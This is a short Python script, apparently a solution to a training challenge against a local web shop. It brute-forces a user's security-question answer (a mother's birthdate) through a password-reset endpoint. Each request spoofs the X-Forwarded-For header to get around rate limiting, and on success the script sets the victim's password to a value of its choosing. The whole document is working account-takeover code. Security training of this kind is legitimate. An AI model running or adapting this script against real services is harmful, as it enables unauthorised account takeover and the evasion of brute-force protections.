from requests import post
from http.client import responses

req = {"email": "jan@t.de", "new": "abc123", "repeat": "abc123"}
i = 1

# guess jan's security question 'Mother's birthday?'
# his mother's birthday is 05/06/78
for year in range(77,99):
    for month in range(1,13):
        for day in range(1, 32):

            datum = f"{month:02}/{day:02}/{year}"
            req["answer"] = datum
            #h = { "Content-Type": "application/json" }
            h = { "Content-Type": "application/json", "X-Forwarded-For": datum }

            res = post('http://localhost:3000/rest/user/reset-password', json=req, headers = h)

            print(i,datum,res.status_code, responses[res.status_code])

            if res.status_code != 401:
                exit()

            i += 1
